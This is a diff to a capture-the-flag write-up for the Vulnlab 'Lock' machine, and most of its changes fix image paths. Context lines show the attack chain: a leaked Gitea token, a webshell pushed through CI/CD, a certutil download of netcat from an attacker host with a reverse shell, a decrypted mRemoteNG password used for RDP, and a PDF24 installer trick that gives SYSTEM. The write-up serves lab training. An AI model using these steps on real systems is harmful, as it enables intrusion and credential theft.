@@ -5,7 +5,7 @@ categories: [CTF, Vulnlab]
 tags: [windows, git, gitea, dirbust, web discovery, rdp, mRemoteNG]
 ---
 
-![Lock](/assets/img/ctf/vulnhub/easy/lock/lock.png))
+![Lock](/assets/img/ctf/vulnlab/easy/lock/lock.png))
 
 # Initial Intel
 * Difficulty: Easy
@@ -65,7 +65,7 @@ Notable services:
 
 #### TCP/80 - Webserver
 
-![Webserver Landing Page](/assets/img/ctf/vulnhub/easy/lock/1.png)
+![Webserver Landing Page](/assets/img/ctf/vulnlab/easy/lock/1.png)
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          
@@ -104,7 +104,7 @@ Wasn't too sure initially what this was, other than mention of a Githapp. Explor
 http://10.10.92.132:3000/
 ```
 
-![Gitea Landing Page](/assets/img/ctf/vulnhub/easy/lock/2.png)
+![Gitea Landing Page](/assets/img/ctf/vulnlab/easy/lock/2.png)
 
 Performed web discovery here too:
 
@@ -117,7 +117,7 @@ http://10.10.92.132:3000/explore/repos
 
 Found a repo page:
 
-![Gitea Repositories](/assets/img/ctf/vulnhub/easy/lock/3.png)
+![Gitea Repositories](/assets/img/ctf/vulnlab/easy/lock/3.png)
 
 User *ellen.freeman* has a *dev-scripts* repository available. Let's try to clone it and enumerate it for any intel.
 
@@ -181,7 +181,7 @@ Date:   Wed Dec 27 11:36:39 2023 -0800
 
 Great, I found a *personal access token* that was removed in an earlier commit:
 
-![Git Personal Access Token](/assets/img/ctf/vulnhub/easy/lock/4.png)
+![Git Personal Access Token](/assets/img/ctf/vullab/easy/lock/4.png)
 
 We'll probably be able to use that to authenticate with the script in the repo somehow. Let's take a look at the script next.
 
@@ -191,7 +191,7 @@ We'll probably be able to use that to authenticate with the script in the repo s
 Usage: python script.py <gitea_domain>
 ```
 
-![Token added to repos.py](/assets/img/ctf/vulnhub/easy/lock/6.png)
+![Token added to repos.py](/assets/img/ctf/vulnlab/easy/lock/6.png)
 
 Here's where I edited the code to add the token in for authentication. Now I'll try to re-run the script:
 
@@ -207,9 +207,9 @@ There's a private repo listed here, *website*. Can we clone it?
 
 I tried to get a bit more context first so I edited the script to print the full repo's metadata array:
 
-![Repo array metadata edit](/assets/img/ctf/vulnhub/easy/lock/8.png)
+![Repo array metadata edit](/assets/img/ctf/vulnlab/easy/lock/8.png)
 
-![Repo array metadata raw](/assets/img/ctf/vulnhub/easy/lock/9.png)
+![Repo array metadata raw](/assets/img/ctf/vulnlab/easy/lock/9.png)
 
 Here I can see the clone URL. I'll rerference that.
 
@@ -247,7 +247,7 @@ nothing to commit, working tree clean
 
 I was able to download the *website* repo. Next, I enumerated for useful intel:
 
-![Website readme](/assets/img/ctf/vulnhub/easy/lock/readme.png)
+![Website readme](/assets/img/ctf/vulnlab/easy/lock/readme.png)
 
 Inside *website/readme.md* a comment states 'CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver'.
 
@@ -290,7 +290,7 @@ To http://10.10.123.175:3000/ellen.freeman/website.git
    236ab92..aca371d  main -> main
 ```
 
-![Website test.txt](/assets/img/ctf/vulnhub/easy/lock/11.png)
+![Website test.txt](/assets/img/ctf/vulnlab/easy/lock/11.png)
 
 I was able to add a file to the live website (http://$lock/test.txt).
 
@@ -325,7 +325,7 @@ To http://10.10.123.175:3000/ellen.freeman/website.git
    236ab92..aca371d  main -> main
 ```
 
-![cmd.aspx webshell](/assets/img/ctf/vulnhub/easy/lock/12.png)
+![cmd.aspx webshell](/assets/img/ctf/vulnlab/easy/lock/12.png)
 
 Now catching a webshell should be easy.
 
@@ -335,7 +335,7 @@ certutil -f -urlcache http://10.8.7.193:8000/win/nc64.exe c:\windows\temp\nc.exe
 c:\windows\temp\nc.exe -nv 10.8.7.193 80 -e cmd
 ```
 
-![Revshell](/assets/img/ctf/vulnhub/easy/lock/13.png)
+![Revshell](/assets/img/ctf/vulnlab/easy/lock/13.png)
 
 
 ```bash
@@ -356,7 +356,7 @@ Found another user *gale.dekarios*. I'll look for interesting files next as the 
 
 I found a file at *c:\users\ellen.freeman\Documents\config.xml*. Seems like an odd place for a config file so I checked it out.
 
-![Config.xml](/assets/img/ctf/vulnhub/easy/lock/15.png)
+![Config.xml](/assets/img/ctf/vulnlab/easy/lock/15.png)
 
 ```bash
 c:\Users>powershell
@@ -375,7 +375,7 @@ Mode                 LastWriteTime         Length Name                          
 -a----        12/28/2023   5:59 AM           3341 config.xml    
 ```
 
-![Encrypted password inside config.xml](/assets/img/ctf/vulnhub/easy/lock/16.png)
+![Encrypted password inside config.xml](/assets/img/ctf/vulnlab/easy/lock/16.png)
 
 There's a password that appears to be encrypted for gale inside the file. The file indicates this is a config file for *mRemoteNG*. I searched to see if we can leverage this in anyway and found the follwing tool:
 
@@ -407,19 +407,19 @@ Got gale's creds. Let's connect now to lateral into the account's context.
 └─$ rdp-connect /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:$lock
 ```
 
-![Gale recon](/assets/img/ctf/vulnhub/easy/lock/17.png)
+![Gale recon](/assets/img/ctf/vulnlab/easy/lock/17.png)
 
 No special privileges or groups for this account either. 
 
 Let's grab the user.txt file before further recon:
 
-![user.txt](/assets/img/ctf/vulnhub/easy/lock/18.png)
+![user.txt](/assets/img/ctf/vulnlab/easy/lock/18.png)
 
 ## Root / SYSTEM
 
 Poking around shows some app shortcuts on Gale's desktop. *PDF24* was referenced in older versions of the repos found. 
 
-![PDF24](/assets/img/ctf/vulnhub/easy/lock/19.png)
+![PDF24](/assets/img/ctf/vulnlab/easy/lock/19.png)
 
 The installed version is *11.15.1* 
 
@@ -451,7 +451,7 @@ Now to run the exploit. I had originally tried running this in Powershell, but h
 C:\Users\gale.dekarios> msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
 ```
 
-![PDF24 Exploit](/assets/img/ctf/vulnhub/easy/lock/22.png)
+![PDF24 Exploit](/assets/img/ctf/vulnlab/easy/lock/22.png)
 
 1. Run the command from above
 2. A dialogue box will run
@@ -462,15 +462,15 @@ Per the exploit instructions, the next step is to
 * click on the link *legacy console mode*
 * select a browser other than IE/Edge to open the link. I selected Firefox
 
-![PDF24 Exploit 2](/assets/img/ctf/vulnhub/easy/lock/23.png)
+![PDF24 Exploit 2](/assets/img/ctf/vulnlab/easy/lock/23.png)
 
 Next, I entered *cmd.exe* in the top dir bar...
 
-![PDF24 Exploit 3](/assets/img/ctf/vulnhub/easy/lock/24.png)
+![PDF24 Exploit 3](/assets/img/ctf/vulnlab/easy/lock/24.png)
 
 ...and cmd opened as *NT Authority/SYSTEM*
 
-![PDF24 SYSTEM](/assets/img/ctf/vulnhub/easy/lock/25.png)
+![PDF24 SYSTEM](/assets/img/ctf/vulnlab/easy/lock/25.png)
 
 After grabbing root.txt at c:\users\Administrator\Desktop\root.txt I completed Lock :)
 
